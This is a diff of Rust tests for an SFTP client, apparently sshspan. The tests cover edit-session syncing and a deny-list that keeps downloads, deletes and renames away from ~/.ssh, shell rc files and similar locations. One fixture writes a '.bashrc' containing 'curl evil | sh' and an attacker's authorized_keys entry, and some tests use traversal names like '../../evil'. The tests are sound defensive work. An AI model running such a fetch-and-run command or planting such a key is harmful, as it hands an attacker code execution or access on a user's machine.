+    /// (`.ok()`): a STAT that failed once left a blank baseline, so the next
+    /// save compared with nothing. It is the download's own STAT now - if
+    /// that fails, the open fails (nothing is staged); a retry then gets the
+    /// real baseline.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_the_open_time_baseline_comes_from_the_download() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1 content");
+        fx.knobs.lock().unwrap().stat_refusals_left = 1;
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+
+        let err = stage_for_edit(&sftp, "/srv/app.conf", &staged)
+            .await
+            .err()
+            .expect("no session without a baseline");
+        assert!(err.contains("Permission denied"), "{err}");
+        assert!(!staged.exists(), "nothing staged");
+        let edit = stage_for_edit(&sftp, "/srv/app.conf", &staged)
+            .await
+            .expect("staged");
+
+        let real = std::fs::metadata(fx.path("/srv/app.conf")).unwrap();
+        assert_eq!(edit.baseline.size, Some(10));
+        assert_eq!(
+            edit.baseline.mtime,
+            Some(
+                real.modified()
+                    .unwrap()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap()
+                    .as_secs() as u32
+            )
+        );
+        assert_eq!(std::fs::read(&staged).unwrap(), b"v1 content");
+    }
+
+    /// A server that reports neither size nor time made every remote change
+    /// invisible (unknown == unknown). The content is compared instead.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_without_size_or_time_a_remote_change_is_found_by_content() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        fx.knobs.lock().unwrap().strip_size_mtime = true;
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"v1").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+
+        // Unchanged on the server: the save goes in.
+        std::fs::write(&staged, b"edit one").unwrap();
+        sync.clone().on_change().await;
+        assert_eq!(fx.read("/srv/app.conf"), b"edit one");
+        // Changed on the server: a conflict, nothing uploaded.
+        fx.write("/srv/app.conf", b"changed by someone");
+        std::fs::write(&staged, b"edit two").unwrap();
+        sync.clone().on_change().await;
+        assert_eq!(
+            fx.read("/srv/app.conf"),
+            b"changed by someone",
+            "{:?} {:?}",
+            events.lock().unwrap(),
+            fx.ops()
+        );
+        let last = events.lock().unwrap().last().cloned().unwrap();
+        assert_eq!(last["conflict"], true, "{last}");
+    }
+
+    // ─── RU6a fix 1, item 13: a periodic look at the staged copy ────────────
+
+    /// notify's Windows backend never reports an overflow, so a save whose
+    /// events were lost there was never uploaded. A periodic check of the
+    /// staged copy syncs it anyway - here with no watcher event at all.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_a_save_no_watcher_reported_is_synced_by_the_periodic_check() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"v1").unwrap();
+        let (sync, _events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        let task = tokio::spawn(periodic_rescan(
+            Arc::downgrade(&sync),
+            std::time::Duration::from_millis(100),
+        ));
+
+        std::fs::write(&staged, b"saved, but no event arrived").unwrap();
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
+        while fx.read("/srv/app.conf") != b"saved, but no event arrived"
+            && std::time::Instant::now() < deadline
+        {
+            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
+        }
+        assert_eq!(fx.read("/srv/app.conf"), b"saved, but no event arrived");
+        // Ending the edit ends the check.
+        sync.end();
+        tokio::time::timeout(std::time::Duration::from_secs(2), task)
+            .await
+            .expect("the periodic check stops with the edit")
+            .unwrap();
+    }
+
+    /// A STAT that fails before a sync-back must not turn into a blind upload.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_failed_check_before_a_sync_back_is_reported_not_uploaded() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"my edit").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        fx.knobs
+            .lock()
+            .unwrap()
+            .stat_refused
+            .push("/srv/app.conf".to_string());
+
+        sync.clone().on_change().await;
+
+        assert_eq!(fx.read("/srv/app.conf"), b"v1");
+        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
+        let events = events.lock().unwrap();
+        assert_eq!(events.len(), 1, "{events:?}");
+        assert_eq!(events[0]["ok"], false);
+        assert!(events[0].get("conflict").is_none(), "{}", events[0]);
+        let error = events[0]["error"].as_str().unwrap_or_default();
+        assert!(
+            error.contains("Could not check link.conf on the server")
+                && error.contains("not uploaded"),
+            "{error}"
+        );
+    }
+
+    /// Two saves in a row: the second is compared with what the FIRST upload
+    /// left on the server, not with the download - no false conflict.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_two_saves_in_a_row_do_not_conflict_with_our_own_upload() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"one").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+
+        sync.clone().on_change().await;
+        std::fs::write(&staged, b"two, longer").unwrap();
+        sync.clone().on_change().await;
+
+        assert_eq!(fx.read("/srv/app.conf"), b"two, longer");
+        let events = events.lock().unwrap();
+        assert!(
+            events.len() == 2 && events.iter().all(|e| e["ok"] == true),
+            "{events:?}"
+        );
+    }
+
+    /// The resolve command's two actions; anything else is refused by name.
+    #[test]
+    fn ru6a_edit_resolutions_are_overwrite_or_reload() {
+        assert_eq!(
+            EditResolution::parse("overwrite"),
+            Ok(EditResolution::Overwrite)
+        );
+        assert_eq!(EditResolution::parse("reload"), Ok(EditResolution::Reload));
+        assert_eq!(
+            EditResolution::parse("merge"),
+            Err("Unknown action \"merge\" - expected \"overwrite\" or \"reload\".".to_string())
+        );
+    }
+
+    // ─── RU6a item 6: ending an edit discards its staged copy ────────────────
+
+    /// Closing an edit, closing its session and locking the vault each end the
+    /// session (found by its id until then) and discard its staged copy.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_ending_an_edit_session_discards_its_staged_copy() {
+        let registry = EditRegistry::new();
+        let local = LocalDir::new();
+        let mut staged_paths = Vec::new();
+        let mut fixtures = Vec::new();
+        for (key, session, edit_id) in [
+            ("s1:/a", "s1", "edit-a"),
+            ("s1:/b", "s1", "edit-b"),
+            ("s2:/c", "s2", "edit-c"),
+        ] {
+            let (sftp, fx) = crate::sftp::testkit::serve().await;
+            let path = local.0.join(edit_id);
+            std::fs::write(&path, b"remote secret").unwrap();
+            let sync = bare_sync(sftp, session, edit_id, &path);
+            registry.insert(
+                key.into(),
+                EditWatch {
+                    session_id: session.into(),
+                    watcher: None,
+                    sync,
+                },
+            );
+            staged_paths.push(path);
+            fixtures.push(fx);
+        }
+        assert!(registry.find("edit-c").is_some());
+        assert!(registry.find("no-such-edit").is_none());
+
+        assert!(registry.stop("s1:/a"));
+        assert!(!staged_paths[0].exists());
+        assert!(!registry.stop("s1:/a"), "already stopped");
+        registry.stop_all_for_session("s1");
+        assert!(!staged_paths[1].exists());
+        assert!(staged_paths[2].exists(), "another session's edit stays");
+        registry.stop_all();
+        assert!(!staged_paths[2].exists());
+        assert!(registry.find("edit-c").is_none());
+    }
+
+    /// An `EditSync` with no baseline and no events, for registry tests.
+    #[cfg(unix)]
+    fn bare_sync(
+        sftp: russh_sftp::client::SftpSession,
+        session: &str,
+        edit_id: &str,
+        path: &std::path::Path,
+    ) -> Arc<EditSync> {
+        Arc::new(EditSync {
+            sftp: Arc::new(sftp),
+            session_id: session.into(),
+            edit_id: edit_id.into(),
+            remote: format!("/{edit_id}"),
+            target: format!("/{edit_id}"),
+            staged: crate::sftp::StagedCopy::new(path.to_path_buf()),
+            mode: None,
+            emit: Arc::new(|_| {}),
+            stopped: std::sync::atomic::AtomicBool::new(false),
+            debounce: EditDebounce::new(std::time::Duration::from_millis(80)),
+            upload_lock: tokio::sync::Mutex::new(()),
+            baseline: std::sync::Mutex::new(RemoteStamp::default()),
+            synced: std::sync::Mutex::new(None),
+            pending: std::sync::Mutex::new(None),
+            retry: SyncRetry::default(),
+        })
+    }
+
+    // ─── RU6a fix 1, item 18: two opens of one file ──────────────────────────
+
+    /// Two `sftp_open_for_edit` calls for the same file: the second insert
+    /// dropped the first watch without ending it - its staged copy lingered and
+    /// its saves stopped syncing without a word. A replaced session is ended
+    /// properly, and an open session is found by its key (so a second open can
+    /// reuse it).
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_a_second_session_for_one_file_ends_the_first_properly() {
+        let registry = EditRegistry::new();
+        let local = LocalDir::new();
+        let (sftp_a, _fa) = crate::sftp::testkit::serve().await;
+        let (sftp_b, _fb) = crate::sftp::testkit::serve().await;
+        let first_path = local.0.join("first");
+        let second_path = local.0.join("second");
+        std::fs::write(&first_path, b"x").unwrap();
+        std::fs::write(&second_path, b"x").unwrap();
+        let first = bare_sync(sftp_a, "s1", "edit-1", &first_path);
+        let second = bare_sync(sftp_b, "s1", "edit-2", &second_path);
+        let watch = |sync: &Arc<EditSync>| EditWatch {
+            session_id: "s1".into(),
+            watcher: None,
+            sync: sync.clone(),
+        };
+
+        registry.insert("s1:/f".into(), watch(&first));
+        assert_eq!(
+            registry
+                .live_for_key("s1:/f")
+                .map(|s| s.edit_id().to_string()),
+            Some("edit-1".to_string())
+        );
+        registry.insert("s1:/f".into(), watch(&second));
+
+        assert!(first.is_stopped(), "the replaced session was ended");
+        assert!(!first_path.exists(), "its staged copy was discarded");
+        assert!(second_path.exists());
+        assert_eq!(
+            registry.find("edit-2").map(|s| s.edit_id().to_string()),
+            Some("edit-2".into())
+        );
+        assert!(registry.find("edit-1").is_none());
     }
 
     // ─── local pane commands off the main thread (A7-48) ─────────────────────
@@ -5564,7 +9015,9 @@ mod tests {
                 "{name} may be uploaded"
             );
         }
-        let other = home.join(".vimrc").display().to_string();
+        // (`.vimrc` was the example here; it is an editor startup file that
+        // is refused too since RU6a fix round 2.)
+        let other = home.join("notes.txt").display().to_string();
         assert!(validate_sftp_local_path(&other, LocalAccess::Write).is_ok());
     }
 
@@ -5584,13 +9037,22 @@ mod tests {
         assert!(windows_startup_dirs(None, None).is_empty());
     }
 
-    fn sensitive_fixture(base: &std::path::Path) -> SensitiveLocations {
-        SensitiveLocations {
+    /// The fixture's locations under `base`, before they are resolved (for
+    /// a test that changes one). The system folders are the real ones.
+    fn fixture_locations(base: &std::path::Path) -> Locations {
+        Locations {
             managed_config_dir: Some(base.join("cfg")),
             ssh_dir: Some(base.join("home/.ssh")),
             startup_dirs: windows_startup_dirs(Some(&base.join("AppData")), None),
-            shell_rc_files: vec![base.join("home/.bashrc")],
+            shell_startup: vec![base.join("home/.bashrc")],
+            program_files: vec![base.join("home/.gitconfig")],
+            app_data_dir: Some(base.join("data")),
+            system_dirs: crate::commands::system_dirs(),
         }
+    }
+
+    fn sensitive_fixture(base: &std::path::Path) -> SensitiveLocations {
+        fixture_locations(base).resolve()
     }
 
     #[test]
@@ -5639,12 +9101,11 @@ mod tests {
         std::fs::create_dir_all(base.join("home")).unwrap();
         std::os::unix::fs::symlink(&real, base.join("home/.ssh")).unwrap();
         std::fs::write(real.join("config"), b"Host x").unwrap();
-        let s = SensitiveLocations {
-            managed_config_dir: None,
+        let s = Locations {
             ssh_dir: Some(base.join("home/.ssh")),
-            startup_dirs: Vec::new(),
-            shell_rc_files: Vec::new(),
-        };
+            ..Locations::default()
+        }
+        .resolve();
 
         // Through the link, and as the resolved target (what canonicalising an
         // existing path yields).
@@ -5862,9 +9323,10 @@ mod tests {
             sanitize_remote_name("trailing..."),
             Some("trailing".to_string())
         );
-        // Control characters cannot appear in Windows file names.
+        // Control characters cannot appear in Windows file names. (NUL is
+        // refused outright - RU6a, item 1.)
         assert_eq!(
-            sanitize_remote_name("a\tb\u{0}c"),
+            sanitize_remote_name("a\tb\u{1}c"),
             Some("a_b_c".to_string())
         );
         // Ordinary names pass through untouched, Unicode included.
@@ -6164,5 +9626,1721 @@ mod tests {
         );
         assert!(validate_sftp_local_path("/etc/passwd", LocalAccess::Write).is_err());
         assert!(validate_sftp_local_path("relative/path", LocalAccess::Write).is_err());
+    }
+
+    // ─── RU6a item 1: every derived local path, and local deletes (A6-02) ────
+
+    /// The canonical form of a scratch directory (the fixtures compare
+    /// resolved paths).
+    #[cfg(unix)]
+    fn canonical(dir: &LocalDir) -> PathBuf {
+        std::fs::canonicalize(&dir.0).unwrap()
+    }
+
+    /// A local path built from remote names must be a plain chain of usable
+    /// names below the destination: no `..`, no root, drive or share, no NUL,
+    /// no Windows device name, nothing Windows would rename on disk.
+    #[test]
+    fn ru6a_derived_local_paths_refuse_names_that_are_not_plain() {
+        let root = std::env::temp_dir().join(format!("sshspan-ru6a-root-{}", uuid::Uuid::new_v4()));
+        let s = sensitive_fixture(std::path::Path::new("/fixture-not-here"));
+        let refused = |path: PathBuf| derived_local_refusal(&root, &path, &s);
+        for bad in [
+            root.join("a").join("..").join("x"),
+            root.join("CON"),
+            root.join("sub").join("nul.txt"),
+            root.join("a\u{0}b"),
+            root.join("C:x"),
+            root.join("trailing."),
+            root.join("back:up"),
+            std::env::temp_dir().join("elsewhere").join("x"),
+        ] {
+            assert!(
+                refused(bad.clone()).is_some(),
+                "must refuse {}",
+                bad.display()
+            );
+        }
+        for good in [
+            root.join("ok.txt"),
+            root.join("a").join("b c").join("é€.txt"),
+        ] {
+            assert_eq!(refused(good.clone()), None, "{}", good.display());
+        }
+    }
+
+    /// A remote folder whose own files are called `.bashrc` and `.ssh/...`
+    /// downloaded into a folder where those names ARE the shell rc file and
+    /// `~/.ssh`: only the destination folder was checked, so they were
+    /// written. Each derived path is re-checked; refused ones are skipped
+    /// and reported, and no folder is created inside a denied location.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_folder_download_never_writes_into_a_denied_location() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/home/.bashrc", b"curl evil | sh");
+        fx.write(
+            "/srv/home/.ssh/authorized_keys",
+            b"ssh-ed25519 AAAA attacker",
+        );
+        fx.write("/srv/home/notes.txt", b"fine");
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        let s = sensitive_fixture(&base);
+
+        let expanded =
+            expand_download_with(&sftp, "/srv/home", &base, &download_ctx(false), None, &s)
+                .await
+                .unwrap();
+
+        let locals: Vec<PathBuf> = expanded
+            .items
+            .iter()
+            .map(|i| PathBuf::from(&i.local_path))
+            .collect();
+        assert_eq!(locals, vec![base.join("home").join("notes.txt")]);
+        assert!(
+            !base.join("home").join(".ssh").exists(),
+            "no folder may be created inside ~/.ssh"
+        );
+        let notes = expanded.notes.into_vec().join("\n");
+        assert!(notes.contains("/srv/home/.bashrc"), "{notes}");
+        assert!(notes.contains("/srv/home/.ssh"), "{notes}");
+    }
+
+    /// The single-file case: the remote name, or the rename the renderer
+    /// sends for a conflict, must not land on a denied file either.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_single_file_download_onto_a_denied_file_is_skipped() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/.bashrc", b"x");
+        fx.write("/srv/a.txt", b"x");
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        let home = base.join("home");
+        std::fs::create_dir_all(&home).unwrap();
+        let s = sensitive_fixture(&base);
+
+        for (remote, rename) in [("/srv/.bashrc", None), ("/srv/a.txt", Some(".bashrc"))] {
+            let expanded =
+                expand_download_with(&sftp, remote, &home, &download_ctx(false), rename, &s)
+                    .await
+                    .unwrap();
+            assert!(expanded.items.is_empty(), "{remote} {rename:?}");
+            let notes = expanded.notes.into_vec().join("\n");
+            assert!(notes.contains(remote), "{notes}");
+        }
+    }
+
+    /// A queued download is written much later than it was checked (resumed
+    /// after a reconnect, restored after a restart): the deny-list is checked
+    /// again on its final path when the transfer starts.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_a_queued_download_rechecks_the_deny_list_on_its_final_path() {
+        let base = std::path::PathBuf::from("/fixture");
+        let s = sensitive_fixture(&base);
+        for denied in [
+            base.join("home/.ssh/authorized_keys"),
+            base.join("home/.bashrc"),
+            base.join("cfg/ssh/config"),
+        ] {
+            assert!(
+                local_write_refusal_with(&denied, &s).is_some(),
+                "{}",
+                denied.display()
+            );
+        }
+        assert_eq!(
+            local_write_refusal_with(&base.join("home/docs/a.txt"), &s),
+            None
+        );
+    }
+
+    /// The staged copy of an edited file is a fresh name DIRECTLY inside the
+    /// staging folder, whatever the session id holds - and a staging folder
+    /// that sits in a denied location is refused.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_the_edit_staging_path_stays_a_plain_child_of_the_staging_folder() {
+        let local = LocalDir::new();
+        let temp = canonical(&local);
+        let s = sensitive_fixture(std::path::Path::new("/fixture-not-here"));
+        for session in [
+            "3f2a1b9c-aaaa-bbbb",
+            "../../evil",
+            "a/b\\c..d",
+            "\u{e9}\u{20ac}x\u{1f600}",
+        ] {
+            let p = edit_stage_path(&temp, session, "notes.txt", &s)
+                .unwrap_or_else(|e| panic!("{session:?}: {e}"));
+            assert_eq!(p.parent(), Some(temp.as_path()), "{session:?} -> {p:?}");
+            assert!(crate::sftp::path_has_inert_extension(&p), "{p:?}");
+            let name = p.file_name().unwrap().to_string_lossy().into_owned();
+            assert!(
+                !name.starts_with('.') && !name.contains(['/', '\\']),
+                "{name:?}"
+            );
+        }
+        let denied = sensitive_fixture(&temp);
+        let inside_ssh = temp.join("home").join(".ssh");
+        std::fs::create_dir_all(&inside_ssh).unwrap();
+        assert!(edit_stage_path(&inside_ssh, "3f2a1b9c", "notes.txt", &denied).is_err());
+    }
+
+    /// Windows resolves `..` before it looks at the disk (and Linux's mkdir -p
+    /// walks through it), so `<home>\x\..\.ssh` reached `~/.ssh` even though
+    /// neither spelling matched the deny-list - when `~/.ssh` did not exist
+    /// yet, the queue's `create_dir_all` made it.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_local_paths_with_parent_segments_are_refused() {
+        let base = std::path::PathBuf::from("/fixture");
+        let s = sensitive_fixture(&base);
+        for p in [
+            "/fixture/home/x/../.ssh/config",
+            "/fixture/home/docs/../../cfg/ssh/config",
+            "/fixture/home/docs/..",
+        ] {
+            for access in [LocalAccess::Write, LocalAccess::Read] {
+                assert!(
+                    validate_sftp_local_path_with(p, access, &s).is_err(),
+                    "{p} {access:?}"
+                );
+            }
+        }
+        assert!(
+            validate_sftp_local_path_with("/fixture/home/docs/a.txt", LocalAccess::Write, &s)
+                .is_ok()
+        );
+    }
+
+    /// A target several levels below a symbolic link that points into
+    /// `~/.ssh` resolves through the link even though the levels in between
+    /// do not exist yet (they used to be judged literally).
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_a_link_into_a_denied_folder_is_followed_through_missing_levels() {
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        std::fs::create_dir_all(base.join("home/.ssh")).unwrap();
+        std::fs::create_dir_all(base.join("dl")).unwrap();
+        std::os::unix::fs::symlink(base.join("home/.ssh"), base.join("dl/link")).unwrap();
+        let s = sensitive_fixture(&base);
+        let target = base.join("dl/link/new/deeper/file.txt");
+        assert!(validate_sftp_local_path_with(
+            &target.display().to_string(),
+            LocalAccess::Write,
+            &s
+        )
+        .is_err());
+        let fine = base.join("dl/new/deeper/file.txt");
+        assert!(
+            validate_sftp_local_path_with(&fine.display().to_string(), LocalAccess::Write, &s)
+                .is_ok()
+        );
+    }
+
+    /// Deleting the home folder deleted `~/.ssh`, the shell rc files and the
+    /// vault with it: a folder that HOLDS a denied location is refused, by its
+    /// own spelling and through links (a `~/.ssh` that is a link into a
+    /// dotfiles checkout makes the checkout hold the keys). Checked through
+    /// the validator the delete runs first - never by deleting anything real.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_deleting_a_folder_that_holds_a_denied_location_is_refused() {
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        for dir in ["home/.ssh", "home/docs", "data", "dotfiles/ssh", "other"] {
+            std::fs::create_dir_all(base.join(dir)).unwrap();
+        }
+        let s = sensitive_fixture(&base);
+        let check = |p: PathBuf, s: &SensitiveLocations| {
+            validate_local_delete_with(&p.display().to_string(), s)
+        };
+        for refused in [
+            base.join("home"),
+            base.clone(),
+            base.join("home/.ssh"),
+            base.join("data"),
+        ] {
+            assert!(check(refused.clone(), &s).is_err(), "{}", refused.display());
+        }
+        assert!(check(base.join("home/docs"), &s).is_ok());
+        assert!(check(base.join("other"), &s).is_ok());
+
+        // The locations are resolved when they are built (once per batch),
+        // so the link exists first - as a dotfiles `~/.ssh` does.
+        std::fs::create_dir_all(base.join("home2")).unwrap();
+        std::os::unix::fs::symlink(base.join("dotfiles/ssh"), base.join("home2/.ssh")).unwrap();
+        let linked = Locations {
+            ssh_dir: Some(base.join("home2/.ssh")),
+            ..fixture_locations(&base)
+        }
+        .resolve();
+        assert!(check(base.join("dotfiles"), &linked).is_err());
+    }
+
+    /// The real home folder, through the real rules - validator only.
+    #[test]
+    fn ru6a_deleting_the_home_folder_is_refused() {
+        let Some(home) = dirs::home_dir() else { return };
+        assert!(
+            validate_local_delete_with(&home.display().to_string(), &SensitiveLocations::current())
+                .is_err(),
+            "must refuse to delete {}",
+            home.display()
+        );
+    }
+
+    /// Moving the folder that holds `~/.ssh` away, writing into the moved
+    /// copy (no longer on the deny-list) and moving it back got round every
+    /// check - and so did moving a prepared folder into that place.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_moving_a_folder_that_holds_a_denied_location_is_refused() {
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        for dir in ["home/.ssh", "home/docs/a", "prepared"] {
+            std::fs::create_dir_all(base.join(dir)).unwrap();
+        }
+        let s = sensitive_fixture(&base);
+        let rename = |from: PathBuf, to: PathBuf| {
+            validate_local_rename_with(&from.display().to_string(), &to.display().to_string(), &s)
+        };
+        assert!(rename(base.join("home"), base.join("home-moved")).is_err());
+        assert!(rename(base.join("prepared"), base.join("home")).is_err());
+        assert!(rename(base.join("home/docs/a"), base.join("home/docs/b")).is_ok());
+    }
+
+    // ─── RU6a item 2: no type bits is not "a file" ───────────────────────────
+
+    /// The folder the user PICKED was judged by its STAT alone: on a server
+    /// that leaves the type bits out it was queued as one file - a read of a
+    /// directory that can only fail.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_an_untyped_folder_picked_for_download_is_walked_not_read_as_a_file() {
+        let (sftp, _fx) = untyped_tree().await;
+        let local = LocalDir::new();
+        let root = canonical(&local);
+
+        let expanded = expand_download(&sftp, "/t", &root, &download_ctx(false), None)
+            .await
+            .unwrap();
+
+        let mut remotes: Vec<&str> = expanded
+            .items
+            .iter()
+            .map(|i| i.remote_path.as_str())
+            .collect();
+        remotes.sort();
+        assert_eq!(remotes, vec!["/t/d/g", "/t/f"]);
+        assert!(root.join("t").join("d").is_dir());
+    }
+
+    /// "Download as..." and the edit flow need a FILE: a folder is refused
+    /// with a plain message (typed and untyped server alike) instead of a
+    /// failed read, and a file on an untyped server still downloads.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_download_to_refuses_a_folder_with_a_plain_message() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/d/x", b"1");
+        fx.write("/f.txt", b"hello");
+        let local = LocalDir::new();
+        for untyped in [false, true] {
+            fx.knobs.lock().unwrap().untyped_modes = untyped;
+            let err = download_to(&sftp, "/d", &local.file("d"))
+                .await
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains("is a folder"), "untyped={untyped}: {err}");
+            assert!(!std::path::Path::new(&local.file("d")).exists());
+        }
+        download_to(&sftp, "/f.txt", &local.file("f.txt"))
+            .await
+            .expect("an untyped file still downloads");
+        assert_eq!(std::fs::read(local.file("f.txt")).unwrap(), b"hello");
+    }
+
+    /// A pipe is not a file: opening one for reading blocks the server until
+    /// a writer appears, which froze the whole SFTP session. Refused from its
+    /// type, before anything opens it.
+    #[cfg(unix)]
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn ru6a_downloading_a_pipe_is_refused_before_it_is_opened() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.mkdir("/d");
+        let fifo = fx.path("/d/pipe");
+        assert!(std::process::Command::new("mkfifo")
+            .arg(&fifo)
+            .status()
+            .unwrap()
+            .success());
+        let local = LocalDir::new();
+        let outcome = tokio::time::timeout(
+            std::time::Duration::from_secs(3),
+            download_to(&sftp, "/d/pipe", &local.file("pipe")),
+        )
+        .await;
+        // Never leave the test server blocked in open(2) on the pipe.
+        {
+            use std::os::unix::fs::OpenOptionsExt;
+            let _ = std::fs::OpenOptions::new()
+                .write(true)
+                .custom_flags(libc::O_NONBLOCK)
+                .open(&fifo);
+        }
+        let err = outcome
+            .expect("the download blocked on the pipe")
+            .expect_err("a pipe is not a file")
+            .to_string();
+        assert!(err.contains("not a regular file"), "{err}");
+    }
+
+    /// The Send-to walk took every entry that was not a folder or a link for a
+    /// file: a pipe was queued (its read blocks the source server), and a name
+    /// the target needed sanitized was read from the SANITIZED name on the
+    /// source - a file that does not exist there.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_send_to_skips_special_files_and_reads_each_entry_from_its_real_name() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/t/f", b"1");
+        // (Not `a:b`: a letter and a colon read as a drive and are skipped.)
+        fx.write("/t/back:up", b"2");
+        fx.write("/t/d/g", b"3");
+        fx.mkdir("/outside");
+        fx.symlink("../outside", "/t/ln");
+        assert!(std::process::Command::new("mkfifo")
+            .arg(fx.path("/t/pipe"))
+            .status()
+            .unwrap()
+            .success());
+        let got = send_to_walk(&sftp, "/t").await;
+        assert_eq!(
+            got,
+            vec![
+                ("/t/back:up".to_string(), "/dest/t/back_up".to_string()),
+                ("/t/d/g".to_string(), "/dest/t/d/g".to_string()),
+                ("/t/f".to_string(), "/dest/t/f".to_string()),
+            ]
+        );
+    }
+
+    /// On a server without type bits the Send-to walk queued a folder as a
+    /// file and a link as something to copy; entries are classified like the
+    /// download walk does.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_send_to_walks_folders_of_a_server_without_file_types() {
+        let (sftp, _fx) = untyped_tree().await;
+        let got = send_to_walk(&sftp, "/t").await;
+        assert_eq!(
+            got,
+            vec![
+                ("/t/d/g".to_string(), "/dest/t/d/g".to_string()),
+                ("/t/f".to_string(), "/dest/t/f".to_string()),
+            ]
+        );
+        // ...and the picked root is recognised as a folder.
+        assert_eq!(server_copy_root_is_dir(&sftp, "/t").await, Ok(true));
+        assert_eq!(server_copy_root_is_dir(&sftp, "/t/f").await, Ok(false));
+    }
+
+    /// `expand_server_copy` from `root` to `/dest/<name>`: (source, target)
+    /// pairs of the queued jobs, sorted.
+    #[cfg(unix)]
+    async fn send_to_walk(
+        sftp: &russh_sftp::client::SftpSession,
+        root: &str,
+    ) -> Vec<(String, String)> {
+        let queued: Arc<std::sync::Mutex<Vec<(String, String)>>> = Arc::default();
+        let sink = queued.clone();
+        let enqueue = move |batch: Vec<QueuedItem>| {
+            sink.lock().unwrap().extend(batch.into_iter().map(|item| {
+                let target = item.target.map(|t| t.remote_path).unwrap_or_default();
+                (item.remote_path, target)
+            }))
+        };
+        let name = root.rsplit('/').next().unwrap();
+        expand_server_copy(
+            &enqueue,
+            sftp,
+            root.to_string(),
+            format!("/dest/{name}"),
+            "src".into(),
+            "Source".into(),
+            "tgt".into(),
+            "Target".into(),
+            Arc::default(),
+            Arc::default(),
+        )
+        .await
+        .unwrap();
+        let mut got = queued.lock().unwrap().clone();
+        got.sort();
+        got
+    }
+
+    /// A recursive delete on a server without type bits unlinked folders as
+    /// files (refused) and failed; entries are classified - a link is still
+    /// only unlinked, never followed.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_recursive_delete_works_on_a_server_without_file_types() {
+        let (sftp, fx) = untyped_tree().await;
+        remove_remote_tree(&sftp, "/t")
+            .await
+            .expect("the whole tree is deleted");
+        assert!(!fx.exists("/t"));
+        assert!(fx.exists("/outside"), "a link's target is never touched");
+    }
+
+    // ─── RU6a item 3 ─────────────────────────────────────────────────────────
+
+    /// The staged download is fsynced before it is renamed over the
+    /// destination, like the queue's download leg - otherwise a crash right
+    /// after the rename can leave an empty or partial file under the final
+    /// name. Durability itself cannot be observed from a test; the steps a
+    /// real download goes through can (fix 1: this used to grep the source,
+    /// which a comment could satisfy).
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_download_to_syncs_the_staged_file_before_the_rename() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/f.bin", &vec![3u8; 300_000]);
+        let local = LocalDir::new();
+        let dest = local.file("f.bin");
+
+        download_to(&sftp, "/f.bin", &dest).await.expect("download");
+
+        assert_eq!(download_steps(&dest), vec!["fsync", "rename"]);
+        assert_eq!(std::fs::read(&dest).unwrap().len(), 300_000);
+    }
+
+    // ─── RU6a item 4: per-item results ───────────────────────────────────────
+
+    #[cfg(unix)]
+    fn batch() -> BatchCtx<'static> {
+        BatchCtx {
+            session_id: "sess",
+            server_name: "srv",
+            resume: ResumeMode::Overwrite,
+            preserve_ts: false,
+        }
+    }
+
